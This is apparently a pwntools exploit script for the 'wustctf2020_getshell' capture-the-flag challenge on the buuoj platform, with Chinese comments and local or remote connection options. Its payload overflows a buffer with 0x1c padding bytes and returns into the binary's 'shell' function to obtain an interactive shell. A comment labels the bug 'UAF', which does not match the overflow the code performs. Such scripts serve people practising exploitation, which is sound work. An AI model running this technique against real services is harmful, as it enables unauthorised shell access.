from pwn import *
from LibcSearcher import LibcSearcher
import sys, time

io = -1
############################
#********修改文件名**********
############################
file_name = 'wustctf2020_getshell'
port = 26916

###########修改宏###########
DEBUG = 1
LOG_PRINT = 1
TMUX = 0
def LOG_ADDR_SUCCESS(name:str, addr:int):
    '''
    打印地址
    name: 变量名，str
    addr: 地址，int

    '''
    global LOG_PRINT
    if LOG_PRINT:
        log.success('{} ===> {}'.format(name, hex(addr)))

def LOG_SUCCESS(info):
    '''
    打印信息
    
    '''
    if LOG_PRINT:
        log.success(info)

def Get_Str_Addr(target_addr:str):
    """
    获取字符串的地址

    """
    global io
    return io.search(target_addr.encode()).__next__()

    
if len(sys.argv) > 1 and sys.argv[1].isdigit(): # 远程打
    io = remote('node3.buuoj.cn', int(sys.argv[1]))
elif DEBUG: # 本地打
    io = process('./{}'.format(file_name))
    def STOP(idx:str = 0):
        input('stop{} ===> {}'.format(idx, proc.pidof(io)))
    if TMUX:
        context.terminal = ['tmux', 'splitw', '-h']
        gdb.attach(io, gdbscript='b *0x80485FC\nc\n')
else:
    io = remote('node3.buuoj.cn', port)



io_elf = ELF('./{}'.format(file_name))
log.success("libc used ===> {}".format(io_elf.libs))
context.log_level = 'debug'

##########################下面为攻击代码#######################
##########################下面为攻击代码#######################
'''
UAF
'''
payload = 0x1c * b'a' + p32(io_elf.sym['shell'])
io.send(payload)
io.interactive()
